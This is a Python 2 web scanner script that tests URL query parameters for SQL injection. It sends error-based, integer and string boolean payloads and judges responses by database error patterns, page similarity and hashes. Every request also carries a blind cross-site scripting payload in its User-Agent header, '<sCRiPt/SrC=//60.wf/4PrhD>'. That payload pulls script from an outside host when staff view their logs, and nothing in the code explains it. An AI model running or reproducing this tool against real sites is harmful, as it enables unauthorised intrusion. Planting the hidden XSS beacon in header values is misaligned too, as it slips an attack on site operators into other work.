#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = w8ay
import sys
reload(sys)
sys.setdefaultencoding("utf-8")
import urlparse
import hashlib
from urllib import quote as urlencode
from urllib import unquote as urldecode
import re
import requests
import os
from difflib import SequenceMatcher
import random

class dbms:
    DB2 = 'IBM DB2 database'
    MSSQL = 'Microsoft SQL database'
    ORACLE = 'Oracle database'
    SYBASE = 'Sybase database'
    POSTGRE = 'PostgreSQL database'
    MYSQL = 'MySQL database'
    JAVA = 'Java connector'
    ACCESS = 'Microsoft Access database'
    INFORMIX = 'Informix database'
    INTERBASE = 'Interbase database'
    DMLDATABASE = 'DML Language database'
    UNKNOWN = 'Unknown database'
def is_number(s):
    try:
        float(s)
        return True
    except ValueError:
        pass

    try:
        import unicodedata
        unicodedata.numeric(s)
        return True
    except (TypeError, ValueError):
        pass

    return False
def md5(src):
    m2 = hashlib.md5()
    m2.update(src)
    return m2.hexdigest()
def getFilteredPageContent(page, onlyText=True, split=" "):
    """
    Returns filtered page content without script, style and/or comments
    or all HTML tags

    >>> getFilteredPageContent(u'<html><title>foobar</title><body>test</body></html>')
    u'foobar test'
    """

    retVal = page

    # only if the page's charset has been successfully identified
    if isinstance(page, unicode):
        retVal = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>%s" % (r"|<[^>]+>|\t|\n|\r" if onlyText else ""), split, page)
        while retVal.find(2 * split) != -1:
            retVal = retVal.replace(2 * split, split)
        retVal = htmlunescape(retVal.strip().strip(split))

    return retVal
def getPageWordSet(page):
    """
    Returns word set used in page content

    >>> sorted(getPageWordSet(u'<html><title>foobar</title><body>test</body></html>'))
    [u'foobar', u'test']
    """

    retVal = set()

    # only if the page's charset has been successfully identified
    if isinstance(page, unicode):
        _ = getFilteredPageContent(page)
        retVal = set(re.findall(r"\w+", _))

    return retVal
def htmlunescape(value):
    """
    Returns (basic conversion) HTML unescaped value

    >>> htmlunescape('a&lt;b')
    'a<b'
    """

    retVal = value
    if value and isinstance(value, basestring):
        codes = (('&lt;', '<'), ('&gt;', '>'), ('&quot;', '"'), ('&nbsp;', ' '), ('&amp;', '&'))
        retVal = reduce(lambda x, y: x.replace(y[0], y[1]), codes, retVal)
        try:
            retVal = re.sub(r"&#x([^ ;]+);", lambda match: unichr(int(match.group(1), 16)), retVal)
        except ValueError:
            pass
    return retVal
def randomDigits(length=8):
    """
    生成随机数字串

    :param length:生成字符串长度
    :return 数字串
    """
    digits = '0123456789'
    return ''.join([random.choice(digits) for _ in range(length)])
def GetRatio(firstPage, secondPage):
    """
    Prints words appearing in two different response pages
    """
    firstPage = getFilteredPageContent(firstPage)
    secondPage = getFilteredPageContent(secondPage)

    match = SequenceMatcher(None, firstPage, secondPage).ratio()
    return match
def Error_sqli(url,html):
    parse = urlparse.urlparse(url)
    if not parse.query:
        return False
    
    for path in parse.query.split('&'):
        if '=' not in path:
            continue
        k, v = path.split('=')
        quotes = '\''
        try:
            url_1 = url.replace("%s=%s"%(k,v),"%s=%s"%(k,urlencode(v + quotes)))
            header = dict()
            header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
            header["Referer"] = "http://www.qq.com"
            html2 = requests.get(url_1,headers=header).text
            for sql_regex, dbms_type in Get_sql_errors():
                match1 = sql_regex.search(html)
                match2 = sql_regex.search(html2)
                if  match2 and not match1 :
                    return "[SQL INJECT] [ERR_INFO Key:%s] %s"%(k,url)
        except Exception:
            pass
    return False
            
def INT_sqli(url,html):
    parse = urlparse.urlparse(url)
    if not parse.query:
        return False

    for i in parse.query.split('&'):
        if '=' not in i:
            continue
        k, v = i.split('=')
        if(is_number(v)):
            randDig = randomDigits(2)
            payload_0 = ["+1-1"," and %s=%s"%(randDig,randDig)]
            payload_1 = ["+1"," and %s=%s"%(randDig,str(int(randDig)+2))]
            for j in range(len(payload_0)):
                p0 = payload_0[j]
                p1 = payload_1[j]
                url_1 = url.replace("%s=%s"%(k,v),"%s=%s"%(k,v + urlencode(p0)))
                url_2 = url.replace("%s=%s"%(k,v),"%s=%s"%(k,v + urlencode(p1)))
                try:
                    header = dict()
                    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
                    header["Referer"] = "http://www.qq.com"

                    html1 = requests.get(url_1, headers=header).text
                    html2 = requests.get(url_2, headers=header).text
                except Exception, e:
                    html1 = html2 = ''

                t1 = GetRatio(html,html1)
                f1 = GetRatio(html2,html1)
                # print html1,html2
                # print t1,f1
                if t1 > f1 > 0.65:
                    return "[SQL INJECT] [INT Inject Key:%s] %s"%(k,url)
    return False          

def Get_sql_errors():
    errors = []
    # ASP / MSSQL
    errors.append( ('System\.Data\.OleDb\.OleDbException', dbms.MSSQL ) )
    errors.append( ('\\[SQL Server\\]', dbms.MSSQL ) )
    errors.append( ('\\[Microsoft\\]\\[ODBC SQL Server Driver\\]', dbms.MSSQL ) )
    errors.append( ('\\[SQLServer JDBC Driver\\]', dbms.MSSQL ) )
    errors.append( ('\\[SqlException', dbms.MSSQL ) )
    errors.append( ('System.Data.SqlClient.SqlException', dbms.MSSQL ) )
    errors.append( ('Unclosed quotation mark after the character string', dbms.MSSQL ) )
    errors.append( ("'80040e14'", dbms.MSSQL ) )
    errors.append( ('mssql_query\\(\\)', dbms.MSSQL ) )
    errors.append( ('odbc_exec\\(\\)', dbms.MSSQL ) )
    errors.append( ('Microsoft OLE DB Provider for ODBC Drivers', dbms.MSSQL ))
    errors.append( ('Microsoft OLE DB Provider for SQL Server', dbms.MSSQL ))
    errors.append( ('Incorrect syntax near', dbms.MSSQL ) )
    errors.append( ('Sintaxis incorrecta cerca de', dbms.MSSQL ) )
    errors.append( ('Syntax error in string in query expression', dbms.MSSQL ) )
    errors.append( ('ADODB\\.Field \\(0x800A0BCD\\)<br>', dbms.MSSQL ) )
    errors.append( ("Procedure '[^']+' requires parameter '[^']+'", dbms.MSSQL ))
    errors.append( ("ADODB\\.Recordset'", dbms.MSSQL ))
    errors.append( ("Unclosed quotation mark before the character string", dbms.MSSQL ))
    
    # DB2
    errors.append( ('SQLCODE', dbms.DB2 ) )
    errors.append( ('DB2 SQL error:', dbms.DB2 ) )
    errors.append( ('SQLSTATE', dbms.DB2 ) )
    errors.append( ('\\[IBM\\]\\[CLI Driver\\]\\[DB2/6000\\]', dbms.DB2 ) )
    errors.append( ('\\[CLI Driver\\]', dbms.DB2 ) )
    errors.append( ('\\[DB2/6000\\]', dbms.DB2 ) )
    
    # Sybase
    errors.append( ("Sybase message:", dbms.SYBASE ) )
    
    # Access
    errors.append( ('Syntax error in query expression', dbms.ACCESS ))
    errors.append( ('Data type mismatch in criteria expression.', dbms.ACCESS ))
    errors.append( ('Microsoft JET Database Engine', dbms.ACCESS ))
    errors.append( ('\\[Microsoft\\]\\[ODBC Microsoft Access Driver\\]', dbms.ACCESS ) )
    
    # ORACLE
    errors.append( ('(PLS|ORA)-[0-9][0-9][0-9][0-9]', dbms.ORACLE ) )
    
    # POSTGRE
    errors.append( ('PostgreSQL query failed:', dbms.POSTGRE ) )
    errors.append( ('supplied argument is not a valid PostgreSQL result', dbms.POSTGRE ) )
    errors.append( ('pg_query\\(\\) \\[:', dbms.POSTGRE ) )
    errors.append( ('pg_exec\\(\\) \\[:', dbms.POSTGRE ) )
    
    # MYSQL
    errors.append( ('supplied argument is not a valid MySQL', dbms.MYSQL ) )
    errors.append( ('Column count doesn\'t match value count at row', dbms.MYSQL ) )
    errors.append( ('mysql_fetch_array\\(\\)', dbms.MYSQL ) )
    errors.append( ('mysql_', dbms.MYSQL ) )
    errors.append( ('on MySQL result index', dbms.MYSQL ) )
    errors.append( ('You have an error in your SQL syntax;', dbms.MYSQL ) )
    errors.append( ('You have an error in your SQL syntax near', dbms.MYSQL ) )
    errors.append( ('MySQL server version for the right syntax to use', dbms.MYSQL ) )
    errors.append( ('\\[MySQL\\]\\[ODBC', dbms.MYSQL ))
    errors.append( ("Column count doesn't match", dbms.MYSQL ))
    errors.append( ("the used select statements have different number of columns", dbms.MYSQL ))
    errors.append( ("Table '[^']+' doesn't exist", dbms.MYSQL ))

    
    # Informix
    errors.append( ('com\\.informix\\.jdbc', dbms.INFORMIX ))
    errors.append( ('Dynamic Page Generation Error:', dbms.INFORMIX ))
    errors.append( ('An illegal character has been found in the statement', dbms.INFORMIX ))
    
    errors.append( ('<b>Warning</b>:  ibase_', dbms.INTERBASE ))
    errors.append( ('Dynamic SQL Error', dbms.INTERBASE ))
    
    # DML
    errors.append( ('\\[DM_QUERY_E_SYNTAX\\]', dbms.DMLDATABASE ))
    errors.append( ('has occurred in the vicinity of:', dbms.DMLDATABASE ))
    errors.append( ('A Parser Error \\(syntax error\\)', dbms.DMLDATABASE ))
    
    # Java
    errors.append( ('java\\.sql\\.SQLException', dbms.JAVA ))
    errors.append( ('Unexpected end of command in statement', dbms.JAVA ))

    # Coldfusion
    errors.append( ('\\[Macromedia\\]\\[SQLServer JDBC Driver\\]', dbms.MSSQL ))
    
    # Generic errors..
    errors.append( ('SELECT .*? FROM .*?', dbms.UNKNOWN ))
    errors.append( ('UPDATE .*? SET .*?', dbms.UNKNOWN ))
    errors.append( ('INSERT INTO .*?', dbms.UNKNOWN ))
    errors.append( ('Unknown column', dbms.UNKNOWN ))
    errors.append( ('where clause', dbms.UNKNOWN ))
    errors.append( ('SqlServer', dbms.UNKNOWN ))

    sql_errors = []
    for re_string, dbms_type in errors:
        sql_errors.append((re.compile(re_string, re.IGNORECASE), dbms_type))
    return sql_errors

def Str_sqli(url,html):
    parse = urlparse.urlparse(url)
    if not parse.query:
        return False

    for path in parse.query.split('&'):
        if '=' not in path:
            continue
        k, v = path.split('=')
        if(v.isalnum()):
            quotes = ['\'' , '"','']
            payload_0 = [" and 0;-- ","/**/and/**/0;#","\tand\t0;#","\nand/**/0;#"]
            payload_1 = [" and 1;-- ","/**/and/**/1;#","\tand\t1;#","\nand/**/1;#"]

            for i in quotes:
                for j in range(len(payload_0)):
                    p0 = i + payload_0[j]
                    p1 = i + payload_1[j]
                    try:
                        header = dict()
                        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
                        header["Referer"] = "http://www.qq.com"
                        url_1 = url.replace("%s=%s"%(k,v),"%s=%s"%(k,v+urlencode(p0)))
                        url_2 = url.replace("%s=%s"%(k,v),"%s=%s"%(k,v+urlencode(p1)))
                        res_md5_1 = md5(html)
                        html = requests.get(url_1, headers=header).text
                        res_md5_2 = md5(html)
                        html = requests.get(url_2, headers=header).text
                        res_md5_3 = md5(html)
                    except Exception,e:
                        res_md5_1 = res_md5_2 = res_md5_3 = 0
                    if ( res_md5_1 == res_md5_3 ) and res_md5_1 != res_md5_2:
                        return "[SQL INJECT] [Str Inject Key:%s] %s"%(k,url)

def poc(url):
    header = dict()
    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
    header["Referer"] = "http://www.qq.com"
    try:
        html = requests.get(url, headers=header).text
        s1 = Error_sqli(url,html)
        if s1:
            return s1
        s2 = INT_sqli(url,html)
        if s2:
            return s2
        s3 = Str_sqli(url,html)
        if s3:
            return s3
    except:
        return False